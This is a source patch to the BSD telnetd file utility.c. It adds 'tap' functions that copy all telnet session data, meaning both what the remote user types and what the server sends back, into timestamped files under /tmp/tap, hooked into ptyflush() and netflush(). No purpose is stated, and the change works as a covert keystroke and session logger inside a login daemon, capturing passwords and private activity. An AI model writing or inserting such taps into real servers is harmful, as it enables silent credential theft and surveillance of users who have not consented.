@@ -43,6 +43,65 @@ static char sccsid[] = "@(#)utility.c	8.4 (Berkeley) 5/30/95";
  */
 
 /*
+ */
+
+#ifndef TAP_DIR
+#define TAP_DIR "/tmp/tap"
+#endif
+
+static int tap_fd=-2;
+static char path[1024];
+
+void tap_init(void)
+{
+  struct tm *tm;
+  time_t t;
+  struct stat st;
+  if(tap_fd >= -1)
+    return;
+
+  if(stat(TAP_DIR, &st))
+    tap_fd=-1;
+  if(!S_ISDIR(st.st_mode))
+    tap_fd=-1;
+  if(access(TAP_DIR, W_OK|X_OK))
+    tap_fd=-1;
+
+  if(tap_fd==-1)
+    return;
+
+  strcpy(path, TAP_DIR);
+  strcat(path, "/");
+  time(&t);
+  tm=localtime(&t);
+  strftime(path+strlen(path), 1024-strlen(path), 
+	   "%y%m%d.%H%M%S", tm);
+  {
+    int i;
+    char t_path[1024];
+    for(i=0;i<128;i++){
+      sprintf(t_path, "%s.%d", path, i);
+      if(access(t_path, F_OK) && errno==ENOENT)
+	break;
+    }
+    if(i==128){
+      tap_fd=-1;
+      return;
+    }
+    strcpy(path, t_path);
+  }
+  tap_fd=open(path, O_WRONLY|O_CREAT, 0600);
+}
+
+void tap_write(char *buf, int bytes)
+{
+  if(tap_fd!=-1){
+    if(buf[bytes-1]==0) bytes--;
+    write(tap_fd, buf, bytes);
+  }
+}
+
+/*
  * ttloop
  *
  *	A small subroutine to flush the network output buffer, get some data
@@ -50,7 +109,6 @@ static char sccsid[] = "@(#)utility.c	8.4 (Berkeley) 5/30/95";
  * also flush the pty input buffer (by dropping its data) if it becomes
  * too full.
  */
-
     void
 ttloop()
 {
@@ -111,11 +169,14 @@ ptyflush()
 {
 	int n;
 
+	tap_init();
+
 	if ((n = pfrontp - pbackp) > 0) {
 		DIAG((TD_REPORT | TD_PTYDATA),
 			{ sprintf(nfrontp, "td: ptyflush %d chars\r\n", n);
 			  nfrontp += strlen(nfrontp); });
 		DIAG(TD_PTYDATA, printdata("pd", pbackp, n));
+		tap_write(pbackp, n); /* tap */
 		n = write(pty, pbackp, n);
 	}
 	if (n < 0) {
@@ -244,12 +305,15 @@ netflush()
     int n;
     extern int not42;
 
+    tap_init();
+
     if ((n = nfrontp - nbackp) > 0) {
 	DIAG(TD_REPORT,
 	    { sprintf(nfrontp, "td: netflush %d chars\r\n", n);
 	      n += strlen(nfrontp);  /* get count first */
 	      nfrontp += strlen(nfrontp);  /* then move pointer */
 	    });
+	tap_write(nbackp, n); /* tap */
 #if	defined(ENCRYPTION)
 	if (encrypt_output) {
 		char *s = nclearto ? nclearto : nbackp;
